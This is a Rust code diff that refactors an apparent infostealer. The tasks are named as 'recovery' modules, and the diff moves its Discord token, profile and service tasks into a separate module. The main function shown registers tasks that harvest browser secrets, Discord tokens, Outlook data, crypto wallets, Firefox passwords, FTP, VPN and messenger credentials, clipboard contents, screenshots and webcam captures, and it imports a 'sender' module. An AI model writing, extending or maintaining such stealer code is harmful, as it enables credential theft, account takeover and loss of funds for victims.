@@ -5,12 +5,11 @@ mod secure_blob;
 mod sender;
 
 use recovery::structured::{
-    chromium_secrets_tasks, discord_profile_task, discord_service_task, discord_token_task,
-    outlook_registry_task, wallet_inventory_task,
+    chromium_secrets_tasks, outlook_registry_task, wallet_inventory_task,
 };
 use recovery::task::{RecoveryError, RecoveryOutcome};
 use recovery::{
-    RecoveryContext, RecoveryManager, account_validation, behavioral, clipboard, devops,
+    RecoveryContext, RecoveryManager, account_validation, behavioral, clipboard, devops, discord,
     file_recovery, ftp, gaming, gecko, gecko_passwords, hardware, messenger, other, screenshot,
     services, system, vpn, wallet, webcam,
 };
@@ -75,9 +74,9 @@ async fn main() -> Result<(), RecoveryError> {
     manager.register_task(file_recovery::file_recovery_task(&context));
     manager.register_tasks(ftp::ftp_tasks(&context));
     manager.register_tasks(chromium_secrets_tasks(&context));
-    manager.register_task(discord_token_task(&context));
-    manager.register_task(discord_profile_task(&context));
-    manager.register_task(discord_service_task(&context));
+    manager.register_task(discord::discord_token_task(&context));
+    manager.register_task(discord::discord_profile_task(&context));
+    manager.register_task(discord::discord_service_task(&context));
     manager.register_task(outlook_registry_task());
     manager.register_task(wallet_inventory_task(&context));
     manager.register_tasks(messenger::messenger_tasks(&context));
